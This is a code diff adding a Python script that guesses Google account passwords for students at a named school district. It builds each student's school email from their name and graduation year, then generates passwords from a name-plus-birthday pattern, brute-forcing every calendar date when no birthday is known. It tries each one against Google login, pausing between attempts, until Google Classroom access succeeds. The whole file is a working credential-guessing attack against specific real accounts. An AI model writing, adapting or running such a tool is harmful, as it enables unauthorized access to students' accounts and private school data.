@@ -1,0 +1,69 @@
+from bs4 import BeautifulSoup
+import requests
+import time
+
+
+class SessionGoogle:
+    def __init__(self, url_login, url_auth, login, pwd):
+        self.ses = requests.session()
+        login_html = self.ses.get(url_login)
+        soup_login = BeautifulSoup(login_html.content).find('form').find_all('input')
+        my_dict = {}
+        for u in soup_login:
+            if u.has_attr('value'):
+                my_dict[u['name']] = u['value']
+        my_dict['Email'] = login
+        my_dict['Passwd'] = pwd
+        self.ses.post(url_auth, data=my_dict)
+
+    def get(self, URL):
+        return self.ses.get(URL).text
+
+
+url_login = "https://accounts.google.com/ServiceLogin"
+url_auth = "https://accounts.google.com/ServiceLoginAuth"
+
+first, last = map(lambda x: x.lower(), input('Name: ').split())
+year = int(input('Year of Anticipated Graduation: ')[-2:])
+email = first[:2]+last[:3]+f'{year}@herricksk12.org'
+
+
+#Generate Password List
+
+try:            ##user inputs birthday
+    bMon, bDay = map(lambda x: int(x), input('Birthday MM/DD (optional): ').split('/'))
+
+    passwordList = [first[:2].upper() + last[:2] + str(bMon) + str(bDay) + str(x) + str(y)
+                for x in range(0,10)
+                for y in range(0,10)]
+
+
+except:         ##user doesn't input birthday
+    print('Birthday not provided')
+    time.sleep(3)
+    month_dict = {1: 31, 2: 29, 3:31, 4:30, 5:31, 6:30, 7: 31, 8:31, 9:30, 10:31, 11:30, 12:31}
+
+    passwordList = [first[:2].upper() + last[:2] + str(month) + str(day) + str(x) + str(y)
+                for month in range(1,13)
+                for day in range(1, month_dict[month]+1)
+                for x in range(0,10)
+                for y in range(0,10)]
+
+
+
+#Loop through passwords
+    
+for passwords in passwordList:
+    try:
+        session = SessionGoogle(url_login, url_auth, email, passwords)
+        corr = session.get('http://classroom.google.com')
+        corr = str(corr)
+        print(passwords)
+        if passwords in corr[944:989]:
+            break
+        time.sleep(60)
+    except:
+        time.sleep(300)
+        
+print('Access Granted')
+print(passwords)
